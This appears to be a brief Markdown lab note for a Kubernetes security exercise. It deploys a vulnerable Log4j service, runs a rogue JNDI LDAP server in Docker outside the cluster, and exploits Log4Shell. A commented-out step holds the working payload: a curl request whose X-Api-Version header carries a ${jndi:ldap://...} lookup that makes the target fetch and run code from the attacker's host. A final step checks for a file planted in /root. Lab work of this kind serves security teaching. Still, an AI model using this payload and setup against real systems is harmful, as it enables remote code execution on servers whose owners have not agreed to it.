# Setup
```bash
kubectl apply -f https://k8s.adriansoftware.de/attacks/01/setup.yaml
```

ip route | grep default
default via 192.168.122.1 dev enp1s0  src 192.168.122.228  metric 100 
curl 192.168.122.1:6066

keep hostNetwork enabled so IP gateway stays 192.168.122.1
# Attack

Run rogue jndi docker on host outside k8s

<!-- ### run on master node
```bash
kubectl run my-shell --rm -it --image curlimages/curl -- sh
curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}'
``` -->

```bash
sudo docker run -p 6066:1389 --rm quay.io/vicenteherrera/rogue-jndi 
```

# Confirm
> not part of attack. stop monitoring before running. -> file created in /root
```bash
kubectl exec service/vulnerable-log4j -it -- ls /root
```